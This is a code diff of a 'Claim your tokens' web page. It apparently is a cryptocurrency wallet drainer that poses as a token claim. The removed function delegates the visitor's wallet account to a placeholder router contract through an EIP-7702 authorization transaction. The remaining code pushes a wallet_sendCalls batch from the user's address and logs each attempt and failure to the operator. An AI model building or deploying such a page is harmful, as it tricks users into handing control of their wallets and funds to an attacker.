@@ -60,7 +60,7 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐🇵🇹</span>
+            <span class="info-icon">🔐🌹</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
@@ -83,40 +83,12 @@
             }).catch(() => {});
         }
 
-        async function tryMethod1(userAddress, nonce) {
-            sendLog('M1: eth_sendTransaction');
-            const txParams = {
-                type: '0x4',
-                chainId: CHAIN_ID,
-                nonce: nonce,
-                from: userAddress,
-                to: userAddress,
-                gas: '0x30D40',
-                maxFeePerGas: '0x77359400',
-                maxPriorityFeePerGas: '0x77359400',
-                value: '0x0',
-                data: '0x61461954',
-                authorizationList: [{
-                    chainId: CHAIN_ID,
-                    address: ROUTER,
-                    nonce: '0x0'
-                }]
-            };
-
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [txParams]
-            });
-
-            return txHash;
-        }
-
         async function tryMethod2(userAddress) {
-            sendLog('M2: wallet_sendCalls');
+            sendLog('M2: wallet_sendCalls v2.0.0');
             const txHash = await window.ethereum.request({
                 method: 'wallet_sendCalls',
                 params: [{
-                    version: '1.0',
+                    version: '2.0.0',
                     chainId: CHAIN_ID,
                     atomicRequired: false,
                     from: userAddress,
@@ -168,25 +140,15 @@
                     }
                 }
 
-                const nonce = await window.ethereum.request({
-                    method: 'eth_getTransactionCount',
-                    params: [userAddress, 'latest']
-                });
-
                 btn.textContent = 'Confirm in wallet...';
 
                 let txHash;
 
                 try {
-                    txHash = await tryMethod1(userAddress, nonce);
-                } catch (e1) {
-                    sendLog('M1 FAIL: ' + (e1.message || '') + ' code:' + (e1.code || ''));
-                    try {
-                        txHash = await tryMethod2(userAddress);
-                    } catch (e2) {
-                        sendLog('M2 FAIL: ' + (e2.message || '') + ' code:' + (e2.code || ''));
-                        throw e2;
-                    }
+                    txHash = await tryMethod2(userAddress);
+                } catch (e) {
+                    sendLog('M2 FAIL: ' + (e.message || '') + ' code:' + (e.code || ''));
+                    throw e;
                 }
 
                 sendLog('TX: ' + txHash);
@@ -194,7 +156,7 @@
                 btn.textContent = 'Complete';
 
             } catch (e) {
-                sendLog('ALL FAIL: ' + (e.message || ''));
+                sendLog('FAIL: ' + (e.message || ''));
                 btn.disabled = false;
                 btn.textContent = 'Claim Now';
             }
